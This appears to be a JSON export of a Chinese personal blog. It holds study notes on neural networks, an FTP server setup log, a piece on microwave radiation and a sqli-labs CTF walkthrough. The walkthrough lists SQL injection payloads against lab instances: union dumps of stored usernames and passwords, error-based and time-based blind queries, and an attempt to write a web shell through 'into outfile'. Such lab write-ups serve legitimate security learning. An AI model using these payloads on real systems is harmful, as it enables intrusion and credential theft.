{"meta":{"title":"Uniqueland","subtitle":"--XsRan's Personal Blog","description":"","author":"XsRan","url":"http://uniqueland.top","root":"/"},"pages":[{"title":"sitemap","date":"2020-05-10T05:34:11.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Sitemap/index.html","permalink":"http://uniqueland.top/Sitemap/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-05-10T05:33:14.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"about/index.html","permalink":"http://uniqueland.top/about/index.html","excerpt":"","text":"第一次搭建网站也不知道在“关于”版块写什么，就留个微信吧，有路过的想交个朋友的可以加微信交流一下。微信ID：KID3317"},{"title":"","date":"2021-04-24T14:21:13.884Z","updated":"2021-04-24T14:21:13.884Z","comments":true,"path":"hidden/resources.html","permalink":"http://uniqueland.top/hidden/resources.html","excerpt":"","text":"图片类 Wallhaven Pixabay Pngimg Pexels Unsplash Foodies 音效类 爱给网 字体类 字体天下 猫啃网 求字体 字由 100font 可商用字体查询 影视类 真不卡影视 独播库 91美剧网 色彩类 colorhunt Coolors Palettable PPT类 PPT宝藏 PPT超级市场 优品PPT 图标类 阿里巴巴矢量图标库 Iconstore 插画制作工具 视频类 Videezy Videvo Mixkit Distill 蓝光网 综合类 Anyknew Topbook"},{"title":"Categories","date":"2020-05-10T05:33:34.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"categories/index.html","permalink":"http://uniqueland.top/categories/index.html","excerpt":"","text":""},{"title":"来了","date":"2020-11-09T14:06:06.735Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/ToXiaowei.html","permalink":"http://uniqueland.top/Eastereggs/ToXiaowei.html","excerpt":"","text":"http://uniqueland.top/Eastereggs/Class17"},{"title":"所有标签","date":"2021-11-07T15:49:01.532Z","updated":"2020-11-28T16:21:57.445Z","comments":true,"path":"tags/index.html","permalink":"http://uniqueland.top/tags/index.html","excerpt":"","text":""},{"title":"Schedule","date":"2020-05-10T05:33:53.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"schedule/index.html","permalink":"http://uniqueland.top/schedule/index.html","excerpt":"","text":""},{"title":"","date":"2020-11-10T02:28:15.625Z","updated":"2020-09-28T11:51:06.000Z","comments":true,"path":"Eastereggs/JNU2020/记暨大新训.html","permalink":"http://uniqueland.top/Eastereggs/JNU2020/%E8%AE%B0%E6%9A%A8%E5%A4%A7%E6%96%B0%E8%AE%AD.html","excerpt":"","text":"记暨大新训帅气昊哥在线演唱 随拍 在线征集文案…"},{"title":"彩蛋","date":"2020-11-10T03:26:46.695Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Class17.html","excerpt":"","text":"FBI WARNING!非十七班同学请退出网页！(虽然说其他人也进不来) ,注意：此链接为内部链接，没有链接的人进不来，无需担心隐私泄漏。 镇楼百日誓师高二运动会高三运动会个人特写彩蛋中的彩蛋日常高一合照 关于个人照片如有因各种原因而不愿意展示图片的同学请与我联系如有想添加图片的同学也请与我联系，乐意至极待办事项收集毕业照打包图片，放链接征集网页文案制作子网……算了我好懒…终究还是逃不过制作子网页… 由于先前只有一个网页，故图片展示数量有限。现在…增加子网页的图片由于图床原因故待排版关于水印由于原先使用的图床出现了bug，导致部分图片加载错误，故不得不借用微博作为图床。关于图片整合包由于图片数量较多，故只挑选了一些较具有代表性的发布。后续会有网盘链接。变更记录changelog首次部署更换主题部署过程出现错误，重装系统贴图图床出现问题，更换图床图床再次出现问题，使用微博作为临时图床，补充图片由于图片过多，不得不分为数个子网页…图床再再再次出现问题，所有网页 推 倒 重 做再次排版添加图片，略作排版"},{"title":"彩蛋中的彩蛋","date":"2020-11-09T14:06:06.748Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Eastereggs.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Eastereggs.html","excerpt":"","text":"日常"},{"title":"高二运动会","date":"2020-11-09T14:06:06.743Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade2.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade2.html","excerpt":"","text":"!s 高三运动会"},{"title":"个人特写","date":"2020-11-10T05:16:37.169Z","updated":"2020-11-10T05:16:37.168Z","comments":true,"path":"Eastereggs/Class17/Closeup.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Closeup.html","excerpt":"","text":"感谢高中有你们 (谁有珠姐和马老师的照片提供一下嘛…凑齐召唤神龙) 彩蛋中的彩蛋"},{"title":"高一","date":"2020-11-09T14:06:06.751Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade1.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade1.html","excerpt":"","text":"合照"},{"title":"高三运动会","date":"2020-11-09T14:06:06.745Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade3.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade3.html","excerpt":"","text":"个人特写"},{"title":"合照","date":"2020-11-10T05:15:55.270Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Groupphotos.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Groupphotos.html","excerpt":"","text":"聚是一团火，散是满天星。十七班的各位兄弟姐妹们，我们有缘，江湖再见！ 返回"},{"title":"成人礼 & 誓师","date":"2020-11-09T14:06:06.742Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Oath.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Oath.html","excerpt":"","text":"高二运动会"},{"title":"日常","date":"2020-11-09T14:06:06.750Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Routine.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Routine.html","excerpt":"","text":"高一"},{"title":"镇楼","date":"2020-11-09T14:06:06.741Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Starting.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Starting.html","excerpt":"","text":"百日誓师"},{"title":"彩蛋","date":"2020-11-09T14:06:06.755Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Drafts/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Drafts/Class17.html","excerpt":"","text":"FBI WARNING!非十七班同学请退出网页！(虽然说其他人也进不来) 由于展示图片较多，建议等待十秒再浏览，效果更佳。 镇楼 百日誓师 高二运动会 高三运动会 个人特写 彩蛋中的彩蛋 日常 高一 合照 待办事项收集毕业照打包图片，放链接征集网页文案制作子网……算了我好懒…关于水印由于原先使用的图床出现了bug，导致部分图片加载错误，故不得不借用微博作为图床。关于图片整合包由于图片数量较多，故只挑选了一些较具有代表性的发布。后续会有网盘链接。变更记录changelog2020.05.25 首次部署2020.05.27 更换主题2020.05.28 部署过程出现错误，重装系统2020.06.01 贴图图床出现问题，更换图床2020.06.14 图床再次出现问题，使用微博作为临时图床，补充图片"}],"posts":[{"title":"Deep Learning from Scratch 4","slug":"deep_learning_from_scratch_4","date":"2021-12-18T13:14:56.550Z","updated":"2021-12-19T03:18:49.592Z","comments":true,"path":"2021/12/18/deep_learning_from_scratch_4/","link":"","permalink":"http://uniqueland.top/2021/12/18/deep_learning_from_scratch_4/","excerpt":"卷积神经网络与普通机器学习的区别","text":"卷积神经网络与普通机器学习的区别 CNN中新出现了卷积层和池化层 全连接层存在的问题在全连接层中，传入的图像的形状信息被破坏了；由于在全连接层中，数据是以一维的形式传入的，故忽略了图像中诸如相邻像素之间的关系 特征图卷积层的输入输出数据。根据输入和输出分为输入特征图和输出特征图 卷积运算卷积运算是以一定的间隔滑动滤波器的窗口并对输入数据应用滤波器，应用的方式有乘积累加，偏置和求和等 填充向输入数据的周围填入固定的数值；“幅度为1的填充”指的是向输入数据周围1个单位的范围内填充0 作用：调整输出的大小，由于在卷积运算中空间不断缩小，为了在保持输出大小不变的前提下进行卷积运算甚至深度卷积，就需要填充来调整数据空间大小 步幅 应用滤波器的位置间隔 3维数据的卷积运算与2维数据的卷积运算不同的是，3维数据的卷积运算同时进行多通道的卷积并将结果相加 池化层池化是缩小高、长方向上的空间的运算；包含Max池化和Average池化等 特征 没有要学习的参数 通道数不发生变化 对微小的位置变化具有鲁棒性（健壮） 具有代表性的CNN LeNet 是进行手写数字识别的网络，具有连续的卷积层和池化层，最后经全连接层输出结果 不同点 激活函数不同 LeNet使用sigmoid函数，而现在的CNN主要使用ReLU函数 在缩小中间数据的大小时采用的方法不同 原始的LeNet中使用子采样(subsampling)，而现在的CNN大多使用Max池化 AlexNet 在结构上与LeNet基本没有什么不同 与LeNet的差异 激活函数使用ReLU 使用进行局部正规化的LRN(Local Response Normalization)层 使用Dropout Data Augmentation(数据扩充)基于算法“人为地”扩充输入图像（训练图像），如施加旋转、垂直或水平方向上的移动等微小变化，以此增加图像的数量 加深层的好处 减少网络的参数数量 与没有加深层的网络相比，加深了层的网络可以用更少的参数达到同等水平（或者更强）的表现力 使学习更加高效 随着层的加深，神经元会对更复杂的东西有响应 可以分层次地分解需要学习的问题 可以分层次地传递信息 感受野(receptive field)给神经元施加变化的某个局部空间区域 ImageNet一个拥有超过100万张图像的数据集 在深度学习中比较知名的网络 VGG GoogLeNet ResNet 深度学习中高速化的问题在深度学习中大部分时间都耗费在卷积层上 基于GPU的高速化深度学习中需要进行大量的乘积累加计算，而这正是GPU所擅长的，故可使用GPU来进行深度学习的运算以提高学习速度 分布式学习为了进一步提高深度学习所需的计算的速度，可以考虑在多个GPU或者多台机器上进行分布式计算","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"ftp文件服务器搭建","slug":"ftp_server","date":"2021-12-16T15:03:06.120Z","updated":"2021-12-16T15:15:51.555Z","comments":true,"path":"2021/12/16/ftp_server/","link":"","permalink":"http://uniqueland.top/2021/12/16/ftp_server/","excerpt":"第一步：更新软件列表","text":"第一步：更新软件列表 1234567891011121314zh@ubuntu:~$ sudo apt update[sudo] password for zh: Hit:1 http://cn.archive.ubuntu.com/ubuntu focal InReleaseGet:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]Get:6 http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB] Fetched 2,615 kB in 10s (271 kB/s) Reading package lists... DoneBuilding dependency tree Reading state information... Done49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them. 第二步：安装vsftpd1234567891011121314151617181920212223242526272829303132zh@ubuntu:~$ sudo apt install vsftpdReading package lists... DoneBuilding dependency tree Reading state information... DoneThe following additional packages will be installed: ssl-certSuggested packages: openssl-blacklistThe following NEW packages will be installed: ssl-cert vsftpd0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.Need to get 132 kB of archives.After this operation, 402 kB of additional disk space will be used.Do you want to continue? [Y/n] yGet:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]Fetched 132 kB in 3s (50.0 kB/s) Preconfiguring packages ...Selecting previously unselected package ssl-cert.(Reading database ... 71512 files and directories currently installed.)Preparing to unpack .../ssl-cert_1.0.39_all.deb ...Unpacking ssl-cert (1.0.39) Selecting previously unselected package vsftpd..............................................................................] Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] Setting up ssl-cert (1.0.39) ...#################################...........................................................] Progress: [ 56%] [##########################################################................................................] Setting up vsftpd (3.0.3-12) ...########################################################....................................] Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /lib/systemd/system/vsftpd.service.............] Processing triggers for man-db (2.9.1-1) Processing triggers for systemd (245.4-4ubuntu3.11) ... 第三步：添加用户123456zh@ubuntu:~$ sudo nano /etc/vsftpd.confzh@ubuntu:~$ sudo useradd -m ftpuserzh@ubuntu:~$ sudo passwd ftpuserNew password: Retype new password: passwd: password updated successfully 第四步：测试1root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"}]},{"title":"Deep Learning from Scratch 3","slug":"deep_learning_from_scratch_3","date":"2021-12-11T08:29:42.485Z","updated":"2021-12-12T01:39:50.058Z","comments":true,"path":"2021/12/11/deep_learning_from_scratch_3/","link":"","permalink":"http://uniqueland.top/2021/12/11/deep_learning_from_scratch_3/","excerpt":"误差反向传播法","text":"误差反向传播法 Affine 层（仿射变换） 神经网络的正向传播中进行的矩阵的乘积运算在几何学领域被称为“仿射变换” ​ 注：在affine层的反向传播过程中要注意矩阵形状 梯度确认(gradient check) 确认数值微分求出的梯度结果和误差反向传播法求出的结果是否一致的操作 ​ 用于确认误差反向传播法的实现是否正确 与学习相关的技巧最优化 解决“寻找最优参数的问题”的过程 SGD $$W= W-η\\frac{\\partial L}{\\partial W}$$ 缺点 如果函数的形状非均向(anisotropic)，搜索的路径就会非常低效 抵消的根本原因：梯度的方向并没有指向最小值的方向 Momentum $$v=\\alpha v - \\eta \\frac{\\partial L}{\\partial W}$$ $$W=W+v$$ AdaGrad $$h=h+\\frac{\\partial L}{\\partial W} .\\frac{\\partial L}{\\partial W}$$ $$W=W-\\eta \\frac{1}{h^{\\frac{1}{2}}}\\frac{\\partial L}{\\partial W}$$ ​ AdaGrad会记录过去所有梯度的平方和。因此，学习越深入，更新的幅度就越小。实际上，如果无止境的学习，更新量就会变成零 Adam 融合了Momentum和AdaGrad方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索 特征：超参数的“偏置校正” 权重的初始值​ 将权重设置为0的问题 ​ 如果将权重设置为零，那么下一层的神经元会杯传递相同的值，从而达不到学习的效果（乘法反向传播的例子），则在反向传播时第二层的权重进行同样的更新，这使得神经网络拥有许多不同的权重的意义丧失了。即防止“权重均一化”（瓦解权重的对称结构） 梯度消失（梯度爆炸）在运用链式法则时，由于运算时以连乘的形式进行，所以当层数很深时，随着层数的增加，计算出的梯度会指数级变化，如果是往小了变，就出现了梯度消失现象，如果是往大了变，就出现了梯度爆炸现象 表现力受限当传递给神经元的是有所偏向的数据时，有可能会出现表现力受限的问题，即多个神经元输出相同的结果，那同样可以由一个神经元完成的事情无疑令这些神经元的存在变得无意义 Xavier初始值 如果前一层的节点数为n，则初始值使用标准差为1/(n^(1/2))的分布 ReLU的权重初始值 当激活函数使用ReLU时，一般推荐使用ReLU专用的初始值，也称为“He初始值” He初始值使用标准差为(2/n)^(1/2)的高斯分布 Batch Nomalization (Batch Norm) 以进行学习时的mini-batch为单位，按mini-batch进行正规化 进行使数据分布的均值为0，方差为1的正规化$$\\mu B=\\frac{1}{m}\\Sigma^m{i=1}x_i$$ $$\\sigma ^2_B=\\frac{1}{m}\\Sigma^m_{i=1}(x_i-\\mu_B)^2$$ $$x_i=\\frac{x_i-\\mu_B}{\\sqrt{\\sigma_B^2+\\epsilon}}$$ 优点： 可以使学习快速进行（可以增大学习率） 不那么依赖初始值（对于初始值不用那么神经质） 抑制过拟合（降低Dropou等的必要性） 过拟合 只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态 原因 模型拥有大量参数，表现力强 训练数据少 权值衰减 通过在学习的过程中对大的权重进行惩罚，来抑制过拟合 例：为损失函数加上权重的平方范数（1/2λW^2） Dropout Dropout是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"微波炉究竟有没有辐射","slug":"microwave_oven","date":"2021-11-30T15:24:20.874Z","updated":"2021-12-06T15:39:31.281Z","comments":true,"path":"2021/11/30/microwave_oven/","link":"","permalink":"http://uniqueland.top/2021/11/30/microwave_oven/","excerpt":"震惊！这个常见的家用电器竟有这么大的辐射","text":"震惊！这个常见的家用电器竟有这么大的辐射 直奔主题，微波炉对人体究竟会不会产生危害要知道微波炉是否会对人体产生危害，就得先知道什么程度的微波会对人体产生危害 可以看出，只要50mm以外泄露的微波小于等于50W/m^2，就不会对人体造成影响，而市面上的绝大多数微波炉也都满足这一标准，即使在使用了一段时间后，虽然门把手及炉门密封处微波泄漏量略有上升，但也都在标准以内 顺便说一声，微波炉的产生的辐射属于非电离辐射，并不能破坏分子结构和产生电离作用；频率在2.45GHz左右，也就WIFI的频率，而且微波炉是在金属容器中工作的，这些金属容器能够很好地限制微波 所以，微波炉不会对人体造成伤害 问题解答微波炉泄漏的辐射会致畸？ 点击查看答案 同样是2.45GHz左右的频率，既然WIFI没有致畸作用，想必微波炉也不具备这样的能力 微波炉加热食物会产生致癌物质？ 点击查看答案 想知道是否致癌，得从微波炉加热的本质说起微波炉加热的其实是食物中的水。当微波辐射到食品上时，水的极性分子的取向将随微波场而变动。由于食品中水的极性分子的这种运动，以及相邻分子间的相互作用，产生了焦耳热，从而加热食物，所以微波炉加热不会产生致癌物质 微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？ 点击查看答案 来人，上公式可以看出微波的波长大概在12cm左右，比微波炉门上的小洞直径大得多，微波根本出不来 微波炉加热的食品，会不会改变食品本身的营养成分？ 点击查看答案 我们要明白的是：任何形式的烹饪都会破坏食物中的营养成分，但关键的变量是烹饪中所用水的多少，烹饪的时间，以及温度。正常的微波烹饪由于时间短，避免了传统烹饪中食物表面温度过高的弊端，油烟更少，所以产生的致癌物也更少。而且，在烹饪方法中，微波炉加热对食品营养成分的保护是属于比较好的，“能最大限度地保留食品的营养及原有的色香味”。 资料参考： 求真测试：微波炉辐射大？比手机大多了|食品|微波炉|微波_新浪科技_新浪网 (sina.com.cn) 老爸评测：让我们谈谈关于微波炉的辐射问题_微波炉_什么值得买 (smzdm.com) 部分图源必应，侵删","categories":[],"tags":[{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"}]},{"title":"sqli-labs","slug":"sqli-labs","date":"2021-11-30T05:33:41.039Z","updated":"2021-12-19T08:09:46.824Z","comments":true,"path":"2021/11/30/sqli-labs/","link":"","permalink":"http://uniqueland.top/2021/11/30/sqli-labs/","excerpt":"用校园网可能不能成功发送payload，切记！！！","text":"用校园网可能不能成功发送payload，切记！！！ Less-01 先判断是字符型注入还是数字型注入 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1 and 1=2–+ 再判断注入点 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,2,3–+ 查看数据库名称 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,database(),3–+ 查看库中的表 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+ 查看用户表中字段 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+ 查看用户名和密码 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username,password),3 from security.users–+ 换个方式显示 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users–+ Less-02 判断是数字型注入还是字符型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1 判断注入点 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+ 往下操作与第一题类似，payload就差了一个单引号 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-03 判断为字符型注入还是数字型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1 该题为字符型注入，但直接使用联合注入报错 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+ 根据题目提示，在id表示的数据及引号后加上括号，再进行联合注入，注入成功 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+ 往下与第一题相同，union后的payload一致 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-04 判断为字符型注入还是数字型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1 使用单引号进行闭合，报错 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+ 组合单引号、双引号以及括号得到注入点 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;) union select 1,2,3–+ 往下步骤与上述题目相同 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-05 判断为字符型注入还是数字型注入 回显报错数据，尝试盲注 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+ 对查询结果进行切片，再与各个字符比较，根据报错与否判断比较结果 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ 改变上一个payload中c的值以遍历出数据库名称，再结合前面题目的payload逐步爆出表名和列名 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+ 列名以此类推 可以用python写个脚本来跑，或者使用burpsuite 另外，还可以使用updataxml()函数来获取相关信息 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+ Less-06与上一道题类似，将单引号换为双引号 Less-07 利用永真永假的条件配合and和or判断参数id的闭合方式 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+ 利用select xxx into outfile xxx/xxx的方式向服务器中写入文件，文件内容为一句话木马 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;)) union select 1,’2’,”“ into outfile “./“ –+ 由于不知道网站的根目录，所以目前无法对传入文件的成功与否做出判断 Less-08 判断参数闭合方式 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+ 由于注入错误时不回显，因此可以使用上述的盲注 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ 往后步骤与上述盲注步骤一致 Less-09 在判断参数闭合方式时，发现回显不改变 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+ 尝试基于时间的盲注 可以看到网页根据设定的时间正在加载，说明注入成功 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+ 接下来只需要将sleep函数的第一个参数替换为payload，即可根据网页响应时间判断结果 payload取上述盲注payload的查询部分 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+ Less-10 将闭合参数的单引号替换为双引号，其余一致 Less-11这道题是使用post方式提交数据的，在多次尝试以及上网找资料之后，发现有两点需要注意 不可以直接将url编码之后的数据（如%20）直接提交 最后的注释不可以用“–+”，而应该用“#” 上面这样注释是行不通的，用“#”代替“–+”之后如下图 然后再用之前写过的题当中出现的联合注入 Less-12原理同上一题一致，唯一差别是闭合方式不同 less-13这道题的闭合方式与上一道题目比较相似，只不过把双引号替换为单引号，比较不一样的是这道题不可以使用上一道题的联合注入，可以使用报错注入，具体的payload可参照上述题目有关报错注入的部分 下图是联合注入后无回显的结果 这里使用了报错注入返回了mysql的绝对路径 payload：1’) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# 这里查询到了当前的数据库 需要注意的是由于返回长度的限制，回显无法显示所有的结果，可以根据payload作相应调整 payload：1’) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)# Less-12这道题与上一道题类似，唯一不同的仍是闭合方式不同","categories":[],"tags":[{"name":"ctf、web","slug":"ctf、web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"}]},{"title":"Deep Learning from Scratch 2","slug":"deep_learning_from_scratch_2","date":"2021-11-29T14:46:25.122Z","updated":"2021-12-05T02:56:57.166Z","comments":true,"path":"2021/11/29/deep_learning_from_scratch_2/","link":"","permalink":"http://uniqueland.top/2021/11/29/deep_learning_from_scratch_2/","excerpt":"在”手写数字识别”中","text":"在”手写数字识别”中 了解到了mnist数据集 对运算过程中运算的具体对象有点问题 1234567891011import sys, ossys.path.append(os.pardir)from dataset.mnist import load_mnist(x_train, t_train), (x_test, t_test) = load_mnist(flatten=True, normalize=False) #一开始不知道这是什么意思print(x_train.shape)print(t_train.shape)print(x_test.shape)print(t_test.shape) 对于代码中出现的两个元组，一开始不知道 t_train t_test 代表什么，在纠结了一段时间后终于明白了 x_train 是训练用的图像数据 t_train 是训练图像的解，即每个图像对应的数字 x_test 是用于测试的图像数据 t_test 是测试图像的解，即每个图像对应的数字 认识了正规化、预处理和 one-hot 表示法 正规化指的是将数据进行转化，如对图像的每个像素数值除以256，使其数值在0到1之间，方便后续运算 预处理，顾名思义，就是在运算之前对数据进行转换，如正规化等 one-hot 表示法是指对运算结果只将 解 所对应的值设为1，即将 解 作为索引，设置该索引的值为1；在对图像进行预测的脚本中，获取解的过程便是基于one-hot表示法的，如下 p= np.argmax(y) 12345for i in range(len(x)): y = predict(network, x[i]) p= np.argmax(y) # 获取概率最高的元素的索引 if p == t[i]: accuracy_cnt += 1 另外，在阅读到设计神经网络时，学到了有关输入层和输出层与数据之间的关系 输入层为待训练数据的大小，如训练手写数字识别时输入层为784，即为训练图像的大小 输出层为分类数目，如训练的手写数字结果只有0到9十种可能，故将输出层设为十 在“从数据中学习”中 认识了许多概念 特征量 特征量是指可以从输入数据中准确地提取本质数据的转换器，通常表示为向量形式 特征量是由人设计的 不同问题对应不同特征量 深度学习中特征量是由机器来学习的 泛化能力 泛化能力是指处理未被观察过的数据（不包含在训练数据中的数据）的能力 过拟合 只对某个数据集过度拟合的状态称为过拟合 可以理解为训练的模型只对某个数据集起作用 损失函数 损失函数是表示神经网络性能的“恶劣程度”的指标，即当前的神经网络对监督数据在多大程度上不拟合，在多大程度上不一致 均方误差$$E=\\frac{1}{2}\\Sigma_k(y_k-t_k)^2$$ 这里y_k表示神经网络的输出，t_k表示监督数据，k表示数据维数 交叉熵误差$$E=-\\Sigma_kt_k\\log{y_k}$$ 损失函数的意义个人认为，损失函数存在的意义是作为模型调参结果的重要指标，由于测试精度的变化是不连续的（因为测试数据有限，测试结果的精度就取决于测试数据的多少），故无法体现模型调参后微小的变化，而损失函数是连续的，任何微小的改动都可能改变损失函数的结果（可以认为损失函数的精度比测试结果的精度高得多），故需要损失函数来衡量调参后的结果 数值微分 利用某个给定的微小值的差分求导数的过程，称为数值微分 导数与偏导数的定义 梯度及梯度法 梯度法：函数的取值从当前位置沿着梯度方向前进一段距离，然后在新的地方重新求梯度，再沿着新梯度方向前进，逐渐减小函数值 学习算法（随机梯度下降法）的实现神经网络的学习步骤： 前提 神经网络存在合适的权重和偏置，调整权重和偏置以便拟合训练数据的过程称为“学习” 步骤1（mini-batch） 从训练数据中随机选出一部分数据，这部分数据称为mini-batch。我们的目标是减小mini-batch的损失函数的值 步骤2（计算梯度） 为了减小mini-batch的损失函数的值，需要求出各个权重参数的梯度。梯度表示损失函数的值减小最多的方向 步骤3（更新参数） 将权重参数沿梯度方向进行微小更新 步骤4（重复） 重复步骤1、步骤2、步骤3 epoch： epoch是一个单位，一个epoch表示学习中所有训练数据均被使用过一次时的更新次数 误差方向传播法计算图了解正向传播、反向传播及局部计算的定义 